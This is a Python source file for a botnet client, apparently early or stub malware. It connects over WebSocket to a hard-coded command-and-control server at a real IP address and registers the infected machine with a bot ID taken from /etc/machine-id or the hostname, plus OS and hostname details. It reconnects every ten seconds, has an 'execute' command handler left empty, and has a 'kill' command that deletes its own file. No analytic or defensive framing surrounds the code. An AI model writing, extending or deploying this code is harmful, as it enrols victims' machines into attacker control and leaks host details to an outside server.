import asyncio
import websockets
import json
import platform
import os
import socket

C2_URL = 'ws://80.249.146.202:8888'
BOT_ID = ''

def get_id():
    if platform.system() == 'Linux':
        try:
            with open('/etc/machine-id', 'r') as f:
                return f.read().strip()
        except:
            pass
    return socket.gethostname()

async def connect():
    global BOT_ID
    BOT_ID = get_id()
    while True:
        try:
            async with websockets.connect(C2_URL) as ws:
                await ws.send(json.dumps({
                    'cmd': 'register',
                    'bot_id': BOT_ID,
                    'info': {
                        'os': platform.system(),
                        'hostname': platform.node(),
                    },
                    'bandwidth': 10
                }))
                async for msg in ws:
                    data = json.loads(msg)
                    if data.get('cmd') == 'execute':
                        pass
                    elif data.get('cmd') == 'kill':
                        os.remove(__file__)
                        exit(0)
        except:
            await asyncio.sleep(10)

if __name__ == '__main__':
    asyncio.run(connect())
